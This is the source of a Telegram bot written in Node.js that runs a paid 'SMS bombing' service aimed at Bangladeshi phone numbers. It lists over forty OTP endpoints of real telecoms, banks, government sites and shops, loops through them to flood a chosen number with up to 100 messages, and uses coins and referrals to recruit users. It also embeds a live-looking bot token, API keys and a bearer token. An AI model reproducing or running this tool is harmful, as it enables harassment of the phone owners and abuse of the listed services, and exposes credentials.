const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Files
const DB_USERS = './users.json';
const DB_RESTRICTED = './restricted.json';
const DB_HISTORY = './history.json';

let userData = fs.existsSync(DB_USERS) ? JSON.parse(fs.readFileSync(DB_USERS)) : {};
let restrictedNumbers = fs.existsSync(DB_RESTRICTED) ? JSON.parse(fs.readFileSync(DB_RESTRICTED)) : [];
let bombingHistory = fs.existsSync(DB_HISTORY) ? JSON.parse(fs.readFileSync(DB_HISTORY)) : [];

function saveAll() {
    fs.writeFileSync(DB_USERS, JSON.stringify(userData, null, 2));
    fs.writeFileSync(DB_RESTRICTED, JSON.stringify(restrictedNumbers, null, 2));
    fs.writeFileSync(DB_HISTORY, JSON.stringify(bombingHistory, null, 2));
}

// Render server
const app = express();
app.get('/', (req, res) => res.send('Bot is Running!'));
app.listen(process.env.PORT || 3000);

const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info'],
    ['📜 History']
]).resize();

// Helper: Auto-Delete
function autoDelete(ctx, msgId, delay = 300000) { // 5 mins
    setTimeout(() => {
        try { ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, delay);
}

// Check Ban Middleware
bot.use(async (ctx, next) => {
    const uid = ctx.from?.id;
    if (userData[uid]?.banned) {
        const until = userData[uid].banUntil;
        if (until === 'perm' || Date.now() < until) {
            return ctx.reply("❌ আপনি ব্যানড আছেন। এডমিনের সাথে যোগাযোগ করুন।");
        } else {
            userData[uid].banned = false;
            saveAll();
        }
    }
    return next();
});

function register(ctx) {
    const uid = ctx.from.id;
    if (!userData[uid]) {
        userData[uid] = { 
            name: ctx.from.first_name, 
            coins: 50, 
            lastBonus: 0, 
            uniqueNumbers: [], 
            totalReq: 0, 
            banned: false,
            refBy: null
        };
        saveAll();
    }
    return uid;
}

bot.start(async (ctx) => {
    const uid = register(ctx);
    const startPayload = ctx.startPayload; // Referral code check
    if (startPayload && startPayload.startsWith('ref_')) {
        const referrer = startPayload.split('_')[1];
        if (referrer != uid && userData[referrer] && !userData[uid].refBy) {
            userData[uid].refBy = referrer;
            userData[referrer].coins += 100;
            bot.telegram.sendMessage(referrer, "🎊 নতুন রেফারেল! আপনি ১০০ কয়েন পেয়েছেন।");
            saveAll();
        }
    }
    ctx.reply(`👋 স্বাগতম ${ctx.from.first_name}!\nআপনার UID: <code>${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
});

// Admin Command: Broadcast
bot.command('broadcast', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const msg = ctx.message.reply_to_message;
    if (!msg) return ctx.reply("কোনো মেসেজ রিপ্লাই করে /broadcast দিন।");
    
    const users = Object.keys(userData);
    ctx.reply(`📢 ${users.length} জন ইউজারের কাছে পাঠানো শুরু হচ্ছে...`);
    
    for (let id of users) {
        try {
            if (msg.photo) {
                await bot.telegram.sendPhoto(id, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption });
            } else {
                await bot.telegram.sendMessage(id, msg.text);
            }
        } catch (e) {}
    }
    ctx.reply("✅ ব্রডকাস্ট সম্পন্ন।");
});

// Admin Command: Recharge (+/-)
bot.command('recharge', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("Usage: /recharge uid amount");
    const target = args[1], amt = parseInt(args[2]);
    if (userData[target]) {
        userData[target].coins += amt;
        saveAll();
        ctx.reply(`✅ সম্পন্ন! বর্তমান ব্যালেন্স: ${userData[target].coins}`);
    }
});

// Admin Command: Restricted Number
bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const text = ctx.message.text.split(' ')[1];
    if (text.startsWith('-')) {
        const num = text.substring(1);
        restrictedNumbers = restrictedNumbers.filter(n => n !== num);
        ctx.reply(`✅ ${num} নিষিদ্ধ তালিকা থেকে সরানো হয়েছে।`);
    } else {
        restrictedNumbers.push(text);
        ctx.reply(`✅ ${text} নিষিদ্ধ করা হয়েছে।`);
    }
    saveAll();
});

// Admin Command: List
bot.command('list', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const type = ctx.message.text.split(' ')[1];
    if (type === 'user') {
        let list = "👤 **ইউজার লিস্ট:**\n";
        Object.keys(userData).slice(-10).forEach(uid => {
            const u = userData[uid];
            list += `\nName: ${u.name}\nUID: <code>${uid}</code>\nBalance: ${u.coins}\nTotal Uniq Num: ${u.uniqueNumbers.length}\n`;
        });
        ctx.reply(list, { parse_mode: 'HTML' });
    } else if (type === 'rn') {
        ctx.reply(`🚫 **নিষিদ্ধ নম্বর:**\n${restrictedNumbers.join('\n')}`);
    }
});

// Admin Command: Ban
bot.command('ban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1], days = args[2];
    if (userData[target]) {
        userData[target].banned = true;
        userData[target].banUntil = days ? Date.now() + (days * 86400000) : 'perm';
        saveAll();
        ctx.reply(`🚫 ইউজার ${target} কে ব্যান করা হয়েছে।`);
    }
});

// User Command: History
bot.hears('📜 History', (ctx) => {
    const uid = ctx.from.id;
    let list = ctx.from.id === ADMIN_ID ? "📊 **গ্লোবাল হিস্টরি (Last 10):**\n" : "📜 **আপনার হিস্টরি:**\n";
    const filtered = bombingHistory.filter(h => ctx.from.id === ADMIN_ID || h.uid == uid).slice(-10);
    
    if (filtered.length === 0) return ctx.reply("কোনো রেকর্ড পাওয়া যায়নি।");
    
    filtered.forEach(h => {
        list += `\n📍 নম্বর: ${h.phone} | পরিমাণ: ${h.amt} | সময়: ${h.time}`;
        if (ctx.from.id === ADMIN_ID) list += ` | User: ${h.uid}`;
    });
    ctx.reply(list);
});

// User Command: Bonus
bot.hears('🎁 Daily Bonus', (ctx) => {
    const uid = ctx.from.id;
    const diff = (Date.now() - (userData[uid].lastBonus || 0)) / (1000 * 60 * 60);
    if (diff >= 24) {
        userData[uid].coins += 50;
        userData[uid].lastBonus = Date.now();
        saveAll();
        const refLink = `https://t.me/${ctx.botInfo.username}?start=ref_${uid}`;
        ctx.reply(`✅ ৫০ পয়েন্ট বোনাস পেয়েছেন!\n\n🔗 আপনার রেফার লিংক:\n${refLink}\n(কেহ জয়েন করলে পাবেন ১০০ পয়েন্ট)`);
    } else {
        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
    }
});

bot.hears('💰 Balance', (ctx) => ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins}`));
bot.hears('ℹ️ Info', (ctx) => ctx.reply(`👤 Name: ${ctx.from.first_name}\n🆔 UID: <code>${ctx.from.id}</code>\n📞 Admin: @Tnayem48`, { parse_mode: 'HTML' }));

// Bombing Handler
bot.hears('🚀 Boom', (ctx) => {
    ctx.session = { step: 'phone' };
    ctx.reply("📱 বোম্বিং নম্বর দিন:");
});

bot.on('text', async (ctx) => {
    const uid = ctx.from.id;
    const text = ctx.message.text;

    if (ctx.session?.step === 'phone') {
        if (restrictedNumbers.includes(text)) return ctx.reply("🚫 এই নম্বরটি নিষিদ্ধ!");
        if (/^01[3-9]\d{8}$/.test(text)) {
            ctx.session.phone = text;
            ctx.session.step = 'amt';
            ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
        } else ctx.reply("❌ ভুল নম্বর!");
    } else if (ctx.session?.step === 'amt') {
        const amt = parseInt(text);
        if (amt > 0 && amt <= 100) {
            if (userData[uid].coins < amt) return ctx.reply("❌ পর্যাপ্ত পয়েন্ট নেই!");
            startBombing(ctx, ctx.session.phone, amt);
            ctx.session = {};
        }
    }
});

async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    const statusMsg = await ctx.reply(`🚀 কাজ শুরু হচ্ছে...`);
    
    let success = 0, errors = 0, idx = 0;
    while (success < amount) {
        const api = SMS_APIS[idx % SMS_APIS.length];
        idx++;
        try {
            const config = { method: api.method, url: api.url, timeout: 5000, [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone) };
            await axios(config);
            success++;
        } catch (e) { errors++; }
        await new Promise(r => setTimeout(r, 200));
        if (idx > amount + 500) break;
    }

    userData[uid].coins -= amount;
    if (!userData[uid].uniqueNumbers.includes(phone)) userData[uid].uniqueNumbers.push(phone);
    userData[uid].totalReq += 1;
    
    bombingHistory.push({ uid, phone, amt: amount, time: new Date().toLocaleString() });
    if (bombingHistory.length > 200) bombingHistory.shift(); // Keep database light
    saveAll();

    ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 বর্তমান ব্যালেন্স: ${userData[uid].coins}`);
}

bot.launch();
